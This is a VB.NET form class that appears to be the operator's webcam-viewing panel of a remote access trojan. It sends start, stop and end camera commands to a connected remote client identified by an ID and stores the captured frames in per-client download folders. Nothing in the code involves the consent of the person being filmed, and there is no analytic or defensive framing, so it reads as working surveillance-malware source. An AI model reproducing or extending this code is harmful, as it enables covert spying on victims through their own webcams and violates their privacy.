

Public Class WebCam
    Public C As Client
    Public CID As String
    Private Sub Timer1_Tick(sender As Object, e As EventArgs) Handles Timer1.Tick
        Try
            If Not C.IsConnected Then
                Me.Close()
            End If
        Catch ex As Exception
            Debug.WriteLine(ex.Message)
        End Try
    End Sub
    Public Sub save(ByVal b As IO.MemoryStream)
        Try
            Image.FromStream(b).Save(Application.StartupPath & "\Downloads" & "\" & CID & "\WebCam" & "\" & DateAndTime.Now.ToString("yyMMddhhmmssfff") & ".jpg", Imaging.ImageFormat.Jpeg)
        Catch ex As Exception
            ToolStripStatusLabel4.ForeColor = Color.White
        End Try
    End Sub

    Private Sub WebCam_Load(sender As Object, e As EventArgs) Handles MyBase.Load
        ComboBox1.Text = "10%"
        Button1.PerformClick()
    End Sub



    Private Sub Button1_Click(sender As Object, e As EventArgs) Handles Button1.Click

        If Button1.Text = "Start" Then

            Dim B As Byte() = SB("Cam" + Settings.SPL + ComboBox2.SelectedIndex.ToString + Settings.SPL + ComboBox1.Text.Replace("%", "").ToString)
            Dim ClientReq As New Outcoming_Requests(C, B)
            Pending.Req_Out.Add(ClientReq)
            Button1.Text = "Stop"

        Else

            Dim B As Byte() = SB("CLOSECam")
            Dim ClientReq As New Outcoming_Requests(C, B)
            Pending.Req_Out.Add(ClientReq)
            Button1.Text = "Start"

        End If
    End Sub

    Private Sub WebCam_FormClosing(sender As Object, e As FormClosingEventArgs) Handles Me.FormClosing
        Dim B As Byte() = SB("ENDCam")
        Dim ClientReq As New Outcoming_Requests(C, B)
        Pending.Req_Out.Add(ClientReq)
    End Sub

    Private Sub ComboBox2_SelectedIndexChanged(sender As Object, e As EventArgs) Handles ComboBox2.SelectedIndexChanged
        Dim B As Byte() = SB("CLOSECam")
        Dim ClientReq As New Outcoming_Requests(C, B)
        Pending.Req_Out.Add(ClientReq)
        Button1.Text = "Start"
    End Sub

    Private Sub ToolStripStatusLabel4_Click(sender As Object, e As EventArgs) Handles ToolStripStatusLabel4.Click
        If ToolStripStatusLabel4.ForeColor = Color.Green Then
            ToolStripStatusLabel4.ForeColor = Color.White
        Else
            Try
                If PictureBox1.Image Is Nothing Then
                Else

                    If Not IO.Directory.Exists(Application.StartupPath & "\Downloads") Then
                        IO.Directory.CreateDirectory(Application.StartupPath & "\Downloads")
                    End If

                    If Not IO.Directory.Exists(Application.StartupPath & "\Downloads" & "\" & CID) Then
                        IO.Directory.CreateDirectory(Application.StartupPath & "\Downloads" & "\" & CID)
                    End If

                    If Not IO.Directory.Exists(Application.StartupPath & "\Downloads" & "\" & CID & "\WebCam") Then
                        IO.Directory.CreateDirectory(Application.StartupPath & "\Downloads" & "\" & CID & "\WebCam")
                    End If

                    Process.Start(Application.StartupPath & "\Downloads" & "\" & CID & "\WebCam")

                    ToolStripStatusLabel4.ForeColor = Color.Green

                End If

            Catch ex As Exception
                MessageBox.Show(ex.Message)
            End Try

        End If
    End Sub
End Class